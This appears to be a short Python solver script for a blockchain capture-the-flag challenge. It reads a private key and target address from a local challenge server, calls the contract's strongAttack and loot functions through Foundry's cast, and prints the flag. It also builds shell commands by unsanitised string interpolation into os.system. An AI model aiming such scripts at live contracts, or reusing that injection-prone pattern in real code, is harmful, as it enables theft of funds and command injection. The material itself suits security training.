#!/usr/bin/env python3
from os import system
from requests import get
import sys


def csend(fn: str, *args):
    global rpc_url
    global pk
    global target
    system(
        f"cast send --rpc-url {rpc_url} --private-key {pk} {target} '{fn}' {' '.join(args)} &>/dev/null"
    )


if __name__ == "__main__":

    baseUrl = "http://localhost:1337"
    if len(sys.argv) > 2:
        baseUrl = sys.argv[1]

    d = get(baseUrl + "/connection_info").json()

    rpc_url = f"{baseUrl}/rpc"
    pk = d['PrivateKey']
    target = d['TargetAddress']

    csend("strongAttack(uint)", "20")
    csend("loot()")

    flag = get(baseUrl + "/flag")
    print(flag.content.decode())
